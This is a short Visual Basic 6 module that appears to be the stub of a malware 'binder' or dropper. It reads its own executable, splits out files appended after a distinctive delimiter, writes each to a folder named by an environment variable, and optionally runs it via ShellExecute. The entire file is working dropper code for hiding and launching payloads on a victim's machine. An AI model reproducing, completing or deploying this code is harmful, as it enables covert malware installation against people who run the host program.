Attribute VB_Name = "Module1"

Private Declare Function ShellExecute Lib "shell32.dll" Alias _
    "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, _
    ByVal lpFile As String, ByVal lpParameters As String, _
    ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
   Dim lValDev     As Long

Sub Main()
Dim Yo As String, Par() As String, Subp() As String, N As Variant


Open App.Path & "\" & App.EXEName & ".exe" For Binary As 1
    Yo = Space(LOF(1))
    Get 1, , Yo
Close 1

Par() = Split(Yo, "·$%&/((" & "=)(/")

For N = 1 To UBound(Par())

Subp() = Split(Par(N), "=)(/")
    MsgBox Environ(Subp(3)) & "\" & Subp(2)
    
Open Environ(Subp(3)) & "\" & Subp(2) For Binary As 1
    Put 1, , Subp(1)
Close 1

If LCase(Subp(4)) = "si" Then
    lValDev = ShellExecute(Form1.hwnd, "Open", Environ(Subp(3)) & "\" & Subp(2), "", "", 1)
End If

Next N


End Sub
